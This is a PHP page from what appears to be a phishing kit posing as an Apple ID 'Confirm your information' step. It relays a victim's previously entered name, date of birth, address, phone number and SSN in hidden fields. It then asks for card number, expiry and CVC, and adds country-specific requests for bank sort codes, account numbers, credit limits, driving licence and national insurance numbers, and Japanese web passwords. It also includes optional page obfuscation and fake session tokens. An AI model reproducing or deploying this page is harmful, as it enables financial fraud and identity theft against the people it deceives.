<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
require "assets/includes/session_protect.php";
require "assets/includes/detect_country.php";
require "assets/includes/functions.php";
require "assets/includes/language.mob.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";
require "assets/includes/bahasa.php";
if(isset($_POST['mname']) && !empty($_POST['mname'])) {
$mname = "";
}
else {
$mname = $_POST['mname'];
}
if(isset($_POST['address2']) && !empty($_POST['address2'])) {
$address2 = "";
}
else {
$address2 = $_POST['address2'];	
}
if(!empty($_SESSION['carta'])){
	$card = 'placeholder="'.$_SESSION['carta'].'"';
} else {
	$card = 'placeholder="card number"';
}
if(!empty($_POST['ssn'])) {
	$Xssn = $_POST['ssn'];
} else {
	$Xssn = "";
}
if($EncryptScript == 1) {
require "assets/includes/enc.php";
encryptPage();
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Confirm your information</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<?php include("assets/nav.php"); ?>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?php echo $bhs['verify0'];?>
                                    </span><span class="first_name"><?php echo $systemInfo['os'];?>
                                    </span>
                                    <small class="SessionUser"><?php echo $_SESSION['firstname'];?> <?php echo $_SESSION['lastname'];?> <?php echo  $bhs['verify1']; ?> <strong><?php echo $_SESSION['user'];
                                        ?></strong>  </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <a href="Signout.php?sslchannel=true&sessionid=<?php echo md5(gmdate("r")).sha1(gmdate("r"));?>"><button class="btn btn-link"> <?php echo $bhs['verify00']; ?> </button></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">


<form action="#" method="post" name="details" id="details" class="proceed">
<input type="hidden" name="fname" value="<?php echo $_POST['fname'];?>">
<input type="hidden" name="mname" value="<?php echo $_POST['mname'];?>">
<input type="hidden" name="lname" value="<?php echo $_POST['lname'];?>">
<input type="hidden" name="dob" value="<?php echo $_POST['dob'];?>">
<input type="hidden" name="address" value="<?php echo $_POST['address'];?>">
<input type="hidden" name="address2" value="<?php echo $address2;?>">
<input type="hidden" name="town" value="<?php echo $_POST['town'];?>">
<input type="hidden" name="postcodes" value="<?php echo $_POST['postcodes'];?>">
<input type="hidden" name="county" value="<?php echo $_POST['county'];?>">
<input type="hidden" name="country" value="<?php echo $_POST['country'];?>">
<input type="hidden" name="telephone" value="<?php echo $_POST['telephone'];?>">
<input type="hidden" name="ssn" value="<?php echo $Xssn;?>">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $bhs['verify2']; ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" placeholder="<?php echo $bhs['verify4']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="ccno" id="ccno" class="cc-number generic-input-field form-control field" <?php if (!empty($_SESSION['carta'])) echo $card;?> placeholder="<?php echo $bhs['verify5']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="<?php echo $bhs['verify6']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="<?php echo $bhs['verify7']; ?>">
</div>
</div>
</div>
</div>
</div>
<?php
require "assets/form2.php";
if ($negara=="IE"){
echo $sortcode;
echo $accnumber;
echo $creditlimit;
} elseif ($negara=="TH"){
echo $accnumber;
echo $creditlimit;
} elseif($negara=="CH"){
echo $accnumber;
} elseif ($negara=="IN"){
echo $accnumber;
echo $creditlimit;
} elseif ($negara=="NZ"){
echo $creditlimit;
echo $bnz;
} elseif ($negara=="AU"){
echo $creditlimit;
} elseif ($negara=="CA"){
echo $creditlimit;
} elseif ($negara=="GB"){
echo $sortcodeuk;
echo $acno;
echo $drv;
echo $nis;
} elseif ($negara=="JP"){
echo $webid;
echo $passwds;
}
?>
<br>
<br>
<br>
<br>
<br>
<br>
<br>



<input type="hidden" class="ijen" value="Step3.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true">
<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="Next">
</div>
</div>
</div>
</div>
</form>



</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>